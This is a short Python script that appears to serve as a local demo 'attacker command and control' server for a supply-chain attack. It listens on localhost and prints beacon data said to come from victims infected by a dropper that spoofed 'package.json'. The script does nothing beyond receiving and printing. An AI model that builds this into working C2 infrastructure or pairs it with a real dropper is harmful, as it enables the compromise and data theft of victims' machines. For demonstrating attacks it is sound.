from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class AttackerC2Manager(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length else b''
        
        try:
            # Basic parsing of beacon data
            data = json.loads(post_data.decode('utf-8'))
        except:
            data = {"raw_payload": post_data.decode('utf-8')}
        
        print("\n\n" + "="*60)
        print("🚨 [ATTACKER C2] SYSTEM COMPROMISED - BEACON RECEIVED 🚨")
        print("="*60)
        print("Target OS/Platform Information:")
        for key, value in data.items():
            print(f" -> {key.upper()}: {value}")
        print("\nDropper execution complete. 'package.json' successfully spoofed locally.")
        print("Awaiting further commands...")
        print("="*60 + "\n")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
        
    def log_message(self, format, *args):
        # Suppress default HTTP logging to keep console clean for the demo
        pass

if __name__ == '__main__':
    port = 8000
    server = HTTPServer(('127.0.0.1', port), AttackerC2Manager)
    print(f"\n[*] Attacker Command & Control Server started on port {port}")
    print("[*] Waiting for infected victims to phone home...\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down C2 server.")
